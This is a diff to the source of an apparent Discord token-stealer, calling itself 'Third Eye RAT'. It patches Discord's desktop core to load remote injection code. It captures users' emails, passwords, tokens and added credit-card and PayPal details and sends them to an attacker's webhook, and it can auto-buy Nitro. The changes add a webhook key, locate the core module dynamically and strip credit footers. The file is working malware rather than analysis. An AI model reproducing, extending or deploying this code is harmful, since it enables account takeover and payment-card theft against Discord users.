@@ -1,19 +1,24 @@
+//Credits -> github/addi00000
+
 const args = process.argv;
 const fs = require('fs');
 const path = require('path');
 const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
+const Buffer = require('buffer').Buffer
+const hook = '%WEBHOOK_HERE'
 
 const config = {
-  webhook: '%WEBHOOK%',
-  auto_buy_nitro: true,
-  ping_on_run: true,
-  ping_val: '@here',
-  embed_name: 'ThirdEye RAT',
-  embed_icon: 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-  embed_color: 831, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/crxel/RdimoBetterInjection/main/injection.js', //injection url for when it reinjects
+  webhook: hook,
+  webhook_protector_key: '%WEBHOOK_KEY%',
+  auto_buy_nitro: true, 
+  ping_on_run: true, 
+  ping_val: '@here', 
+  embed_name: 'Third Eye RAT', 
+  embed_icon: 'https://preview.redd.it/akjwr6etgpa61.jpg?width=640&crop=smart&auto=webp&s=ee3cb24da61e214e933d88fc5050afa778f18649', 
+  embed_color: 823, 
+  injection_url: 'https://raw.githubusercontent.com/crxel/RdimoBetterInjection/main/injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -411,7 +416,8 @@ function updateCheck() {
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
-  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
+  const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
+  const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
   const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
   if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
   if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
@@ -441,7 +447,8 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOK%', '${config.webhook}')
+        res.replace("'%WEBHOOKHEREBASE64ENCODED%'", "'${hook}'")
+        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -585,6 +592,9 @@ const getBadges = (flags) => {
     case 131072:
       badges += 'Verified Bot Developer, ';
       break;
+    case 4194304:
+      badges += 'Active Developer, ';
+      break;
     case 4:
       badges += 'Hypesquad Event, ';
       break;
@@ -656,27 +666,24 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
+            name: '**Account Info**',
+            value: `Email: **${email}** - Password: **${password}**`,
+            inline: false,
+          },
+          {
             name: '**Discord Info**',
-            value: ```\nNitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**```,
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: false,
           },
           {
             name: '**Token**',
-            value: ```fix\n\`${token}\````,
-            inline: false,
-          },
-          {
-            name: '**Account Info**',
-            value: ```fix\nEmail: **${email}** - Password: **${password}**```,
+            value: `\`${token}\``,
             inline: false,
           },
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-          text: 'Third Eye RAT || ',
         },
       },
     ],
@@ -717,9 +724,6 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
-        footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
-        },
       },
     ],
   };
@@ -758,9 +762,6 @@ const emailChanged = async (email, password, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
         },
       },
     ],
@@ -801,9 +802,6 @@ const PaypalAdded = async (token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
-        footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
-        },
       },
     ],
   };
@@ -842,9 +840,6 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
         },
       },
     ],
@@ -886,9 +881,6 @@ const nitroBought = async (token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
         },
       },
     ],
